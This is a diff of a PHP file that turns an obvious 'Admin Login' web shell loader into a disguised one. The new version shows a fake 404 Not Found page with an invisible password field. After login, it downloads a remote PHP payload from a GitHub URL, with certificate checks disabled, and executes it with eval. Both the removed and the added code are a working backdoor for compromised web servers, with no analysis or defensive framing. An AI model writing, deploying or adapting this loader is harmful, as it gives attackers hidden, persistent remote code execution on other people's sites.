@@ -1,67 +1,104 @@
 <?php
+session_start();
 
-// Function to check if the user is logged in based on the presence of a valid cookie
-function is_logged_in()
-{
-    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Ganti 'user123' dengan nilai yang sesuai
-}
-
-// Check if the user is logged in before executing the content
-if (is_logged_in()) {
-    // Function to get URL content (similar to your previous code)
-    function geturlsinfo($url)
-    {
-        if (function_exists('curl_exec')) {
-            $conn = curl_init($url);
-            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-
-            $url_get_contents_data = curl_exec($conn);
-            curl_close($conn);
-        } elseif (function_exists('file_get_contents')) {
-            $url_get_contents_data = file_get_contents($url);
-        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
-            $handle = fopen($url, "r");
-            $url_get_contents_data = stream_get_contents($handle);
-            fclose($handle);
-        } else {
-            $url_get_contents_data = false;
-        }
-        return $url_get_contents_data;
-    }
-
-    $a = geturlsinfo('https://raw.githubusercontent.com/cindylara1122/script/main/1/2/3/4/5/OldGecko.php');
-    eval('?>' . $a);
-} else {
-    // Display login form if not logged in
-    if (isset($_POST['password'])) {
-        $entered_password = $_POST['password'];
-        $hashed_password = '9e5f7454898af718be1a8c4990f2f861'; // Replace this with your MD5 hashed password
-        if (md5($entered_password) === $hashed_password) {
-            // Password is correct, set a cookie to indicate login
-            setcookie('user_id', 'user123', time() + 3600, '/'); // Ganti 'user123' dengan nilai yang sesuai
-        } else {
-            // Password is incorrect
-            echo "Incorrect password. Please try again.";
-        }
-    }
-    ?>
-    <!DOCTYPE html>
-    <html>
+// Function to display 404 page
+function display_404_page() {
+    header("HTTP/1.0 404 Not Found");
+    echo '<html lang="en">
     <head>
-        <title>Admin Login</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>404 Not Found</title>
+        <style>
+            input[type="password"] {
+                position: absolute; 
+                left: -9999px; 
+                width: 1px; 
+                height: 1px; 
+                opacity: 0; 
+            }
+            input[type="submit"] {
+                padding: 5px; 
+                width: 5%; 
+                background-color: white; 
+                color: white; 
+                border: none; 
+                border-radius: 5px; 
+                cursor: pointer; 
+            }
+            .login-container {
+                position: absolute; 
+                top: 20px; 
+                right: 20px; 
+                text-align: right; 
+            }
+        </style>
     </head>
     <body>
-        <form method="POST" action="">
-            <label for="password">Admin:</label>
-            <input type="password" id="password" name="password">
-            <input type="submit" value="Login">
-        </form>
+        <div class="container">
+            <h1>Not Found</h1>
+            <p>The requested URL was not found on this server.</p>
+            <p>Additionally, a 404 Not Found error was encountered.</p>
+            <div class="login-container">
+                <form action="" method="post">
+                    <input type="password" name="password" placeholder="Password" style="color: #2d3748;">
+                    <input type="submit" value="Login">
+                </form>
+            </div>
+        </div>
     </body>
-    </html>
-    <?php
+    </html>';
+    exit();
+}
+
+// Define the original password (the one you want to hash)
+$original_password = 'your_actual_password'; 
+$hashed_password = '$2y$12$b3LN.f0IAiq/cBR9BOIiXeYgqWHJdHXhkckJ0QhGYtWr20xwFvAF2'; 
+// Check login status
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    // Process login
+    if (isset($_POST['password'])) {
+        $entered_password = $_POST['password'];
+        if (password_verify($entered_password, $hashed_password)) {
+            // Password is correct
+            setcookie('user_id', 'user123', time() + 3600, '/'); 
+            $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
+            echo "Login successful!"; 
+        } else {
+            // Invalid password
+            echo "Incorrect password."; 
+            display_404_page();
+        }
+    } else {
+        display_404_page(); 
+    }
+}
+
+if (isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    function geturlsinfo($url) {
+        if (function_exists('curl_exec')) {
+            $conn = curl_init($url);
+            curl_setopt($conn, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, true);
+            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0");
+            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, false);
+            $data = curl_exec($conn);
+            curl_close($conn);
+        } elseif (function_exists('file_get_contents')) {
+            $data = file_get_contents($url);
+        } else {
+            return false; // No way to fetch content
+        }
+        return $data;
+    }
+
+    $url = 'https://raw.githubusercontent.com/cindylara1122/script/main/1/2/3/4/5/OldGecko.php';
+    $a = geturlsinfo($url);
+    if ($a) {
+        eval('?>' . $a); 
+    } else {
+        echo "Failed to retrieve the external file."; 
+    }
 }
 ?>
